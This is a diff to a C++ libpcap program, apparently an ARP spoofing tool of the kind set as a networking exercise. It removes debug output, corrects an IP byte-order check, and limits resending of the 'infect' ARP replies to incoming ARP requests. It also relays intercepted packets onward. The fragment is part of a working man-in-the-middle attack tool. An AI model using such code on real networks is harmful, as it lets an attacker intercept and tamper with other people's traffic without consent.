@@ -103,14 +103,8 @@ void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int len){
 	}
 	if(flag==1){
 		int res = pcap_sendpacket(handle, relaypacket, size);
-		cout<<string(ethhdr->smac_)<<" to "<<string(ethhdr->dmac_)<<endl;
-		cout<<string(iphdr->ip_src)<<" to "<<string(iphdr->ip_dst)<<endl;
 		if (res != 0) {
-			/*fprintf(stderr, "pcap_sendpacket return %d error=%s\n",res, pcap_geterr(handle));*/
-			printf("size: %d\n", size);
-			cout<<string(ethhdr->smac_)<<" to "<<string(ethhdr->dmac_)<<endl;
-			cout<<string(iphdr->ip_src)<<" to "<<string(iphdr->ip_dst)<<endl;
-			cout<<ntohs(ipinfo->ip_len)<<" verse "<<ntohs(iphdr->ip_len)<<endl;
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n",res, pcap_geterr(handle));
 		}
 	}	
 }
@@ -124,7 +118,8 @@ void SendInfectFlood(pcap_t* handle){
 }
 void SendInfect(pcap_t* handle, Ip sip){
 	for(int i=0; i<idx; i++){
-		if(spoofarr[i].sip_==sip){
+		if((uint32_t)spoofarr[i].sip_==ntohl(sip)){
+			printf("send arp\n");
 			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
 			if (res != 0) {
 				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -137,7 +132,8 @@ int parsing(const u_char* packet, Ip mip){
 	EthHdr* ethhdr=(EthHdr*)packet;
 	if(ntohs(ethhdr->type_)==EthHdr::Arp){
 		ArpHdr* arphdr=(ArpHdr*)(packet+14);
-		return INFECT;
+		if(ntohs(arphdr->op_)==ArpHdr::Request)
+			return INFECT;
 	}
 	else if(ntohs(ethhdr->type_)==EthHdr::Ip4 || ntohs(ethhdr->type_)==EthHdr::Ip6 ){
 		IpHdr* iphdr=(IpHdr*)(packet+14);
@@ -246,13 +242,10 @@ int main(int argc, char* argv[]) {
 		switch (res)
 		{
 		case INFECT:
-			printf("sending arp...\n");
 			arppacket=(EthArpPacket*)rawpacket;
 			SendInfect(handle, arppacket->arp_.sip_);
 			break;
 		case RELAY:
-			if(header->caplen>1000)
-				printf("%d\n", header->caplen);
 			Relay(handle, rawpacket,mmac,header->len);
 		default:
 			break;
